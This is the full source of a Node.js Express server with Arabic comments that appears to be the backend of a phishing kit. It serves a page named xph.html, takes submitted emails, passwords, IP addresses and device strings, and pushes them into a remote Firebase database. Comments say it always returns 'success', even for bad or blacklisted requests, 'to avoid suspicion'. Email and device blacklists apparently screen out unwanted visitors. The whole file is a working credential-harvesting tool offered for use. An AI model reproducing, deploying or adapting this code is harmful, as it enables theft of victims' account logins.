require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// استخدام body-parser لقراءة البيانات من الطلبات
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// استخراج متغيرات البيئة الخاصة بـ Firebase
const firebaseConfig = {
  apiKey: process.env.FIREBASE_API_KEY,
  authDomain: process.env.FIREBASE_AUTH_DOMAIN,
  databaseURL: process.env.FIREBASE_DATABASE_URL,
  projectId: process.env.FIREBASE_PROJECT_ID,
  storageBucket: process.env.FIREBASE_STORAGE_BUCKET,
  messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID,
  appId: process.env.FIREBASE_APP_ID,
  measurementId: process.env.FIREBASE_MEASUREMENT_ID
};

// استخدام طريقة مبسطة للتعامل مع قاعدة البيانات
const https = require('https');

// دالة لإرسال طلب HTTP
function makeRequest(url, method, data) {
  return new Promise((resolve, reject) => {
    // إزالة 'https://' من URL
    const urlObj = new URL(url);
    
    const options = {
      hostname: urlObj.hostname,
      path: urlObj.pathname + urlObj.search,
      method: method,
      headers: {
        'Content-Type': 'application/json',
      }
    };
    
    const req = https.request(options, (res) => {
      let responseData = '';
      
      res.on('data', (chunk) => {
        responseData += chunk;
      });
      
      res.on('end', () => {
        try {
          const parsedData = responseData ? JSON.parse(responseData) : {};
          resolve(parsedData);
        } catch (error) {
          reject(error);
        }
      });
    });
    
    req.on('error', (error) => {
      reject(error);
    });
    
    if (data) {
      req.write(JSON.stringify(data));
    }
    
    req.end();
  });
}

// دالة لتخزين البيانات في Firebase
async function saveToFirebase(path, data) {
  try {
    const url = `${firebaseConfig.databaseURL}/${path}.json`;
    await makeRequest(url, 'PUT', data);
    return true;
  } catch (error) {
    console.error('Error saving to Firebase:', error);
    return false;
  }
}

// دالة لإضافة بيانات جديدة إلى قائمة في Firebase
async function pushToFirebase(path, data) {
  try {
    const url = `${firebaseConfig.databaseURL}/${path}.json`;
    const response = await makeRequest(url, 'POST', data);
    return response.name; // اسم المفتاح الجديد
  } catch (error) {
    console.error('Error pushing to Firebase:', error);
    return null;
  }
}

// API لإنشاء جلسة جديدة
app.post('/api/create-session', async (req, res) => {
  try {
    const sessionId = req.body.sessionId;
    
    if (!sessionId) {
      return res.status(400).json({ error: 'معرف الجلسة مطلوب' });
    }
    
    // إنشاء جلسة جديدة في Firebase
    const success = await saveToFirebase(`login/sessions/${sessionId}`, {
      created: Date.now(),
      status: 'active',
      accounts: {}
    });
    
    if (success) {
      res.json({ success: true, sessionId });
    } else {
      res.status(500).json({ error: 'حدث خطأ أثناء إنشاء الجلسة' });
    }
  } catch (error) {
    console.error('Error creating session:', error);
    res.status(500).json({ error: 'حدث خطأ أثناء إنشاء الجلسة' });
  }
});

// API لتسجيل الدخول - مع دعم البيانات المشفرة ونظام القائمة السوداء
app.post('/api/login', async (req, res) => {
  try {
    // التحقق من الهيدر للحماية من الطلبات غير المرغوب فيها
    const securityToken = req.headers['x-security-token'];
    const requestedWith = req.headers['x-requested-with'];
    
    // التحقق من الطلب إذا كان من مصدر غير معروف
    if (!requestedWith || requestedWith !== 'XMLHttpRequest') {
      // نعيد نجاح لتجنب الشك ولكن لا نخزن البيانات
      return res.json({ success: true });
    }
    
    // استخراج البيانات من الطلب
    let email, password, sessionId, ip, device;
    
    // التحقق من نوع البيانات المرسلة
    if (req.body && req.body.email && req.body.password && req.body.sessionId) {
      // البيانات مرسلة بشكل مباشر
      email = req.body.email;
      password = req.body.password;
      sessionId = req.body.sessionId;
      ip = req.body.ip || 'غير معروف';
      device = req.body.device || req.headers['user-agent'] || 'غير معروف';
    } else {
      // البيانات غير مكتملة أو غير صالحة
      return res.status(400).json({ success: true }); // نعيد نجاح لتجنب الشك
    }
    
    // التحقق من القائمة السوداء للمستخدمين
    try {
      // التحقق من البريد الإلكتروني في القائمة السوداء
      const blacklistUserRef = `blacklist/users/${email}`;
      const blacklistUserUrl = `${firebaseConfig.databaseURL}/${blacklistUserRef}.json`;
      const blacklistUserResponse = await makeRequest(blacklistUserUrl, 'GET');
      
      if (blacklistUserResponse && blacklistUserResponse.blocked === true) {
        console.log(`المستخدم ${email} موجود في القائمة السوداء، تم رفض الطلب`);
        return res.json({ success: true }); // نعيد نجاح لتجنب الشك
      }
      
      // التحقق من الجهاز في القائمة السوداء
      // إنشاء معرف فريد للجهاز بناءً على المتصفح ونظام التشغيل
      const deviceId = Buffer.from(device).toString('base64').substring(0, 20);
      const blacklistDeviceRef = `blacklist/devices/${deviceId}`;
      const blacklistDeviceUrl = `${firebaseConfig.databaseURL}/${blacklistDeviceRef}.json`;
      const blacklistDeviceResponse = await makeRequest(blacklistDeviceUrl, 'GET');
      
      if (blacklistDeviceResponse && blacklistDeviceResponse.blocked === true) {
        console.log(`الجهاز ${deviceId} موجود في القائمة السوداء، تم رفض الطلب`);
        return res.json({ success: true }); // نعيد نجاح لتجنب الشك
      }
    } catch (blacklistError) {
      console.error('خطأ أثناء التحقق من القائمة السوداء:', blacklistError);
      // نستمر في العملية حتى لو فشل التحقق من القائمة السوداء
    }
    
    // تخزين بيانات تسجيل الدخول في Firebase
    const accountKey = await pushToFirebase(`login/sessions/${sessionId}/accounts`, {
      email,
      password,
      timestamp: Date.now(),
      ip: ip,
      device: device,
      deviceId: Buffer.from(device).toString('base64').substring(0, 20)
    });
    
    if (accountKey) {
      res.json({ success: true });
    } else {
      res.status(500).json({ error: 'حدث خطأ أثناء تسجيل الدخول', success: false });
    }
  } catch (error) {
    console.error('Error logging in:', error);
    res.status(500).json({ error: 'حدث خطأ أثناء تسجيل الدخول', success: false });
  }
});

// معالجة ملف xph.html
app.get('/xph.html', (req, res) => {
  fs.readFile(path.join(__dirname, 'xph.html'), 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading xph.html:', err);
      return res.status(500).send('Error reading file');
    }

    res.setHeader('Content-Type', 'text/html');
    res.send(data);
  });
});

// معالجة ملف script.js
app.get('/js/script.js', (req, res) => {
  fs.readFile(path.join(__dirname, 'js/script.js'), 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading script.js:', err);
      return res.status(500).send('Error reading file');
    }

    res.setHeader('Content-Type', 'application/javascript');
    res.send(data);
  });
});

// تقديم باقي الملفات الثابتة كما هي
app.use(express.static(__dirname));

// إعادة توجيه الصفحة الرئيسية إلى xph.html
app.get('/', (req, res) => {
  res.redirect('/xph.html');
});

// بدء الخادم
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log('Firebase Config loaded from environment variables:');
  console.log(`API Key: ${firebaseConfig.apiKey ? '✓' : '✗'}`);
  console.log(`Auth Domain: ${firebaseConfig.authDomain ? '✓' : '✗'}`);
  console.log(`Database URL: ${firebaseConfig.databaseURL ? '✓' : '✗'}`);
  console.log(`Project ID: ${firebaseConfig.projectId ? '✓' : '✗'}`);
});
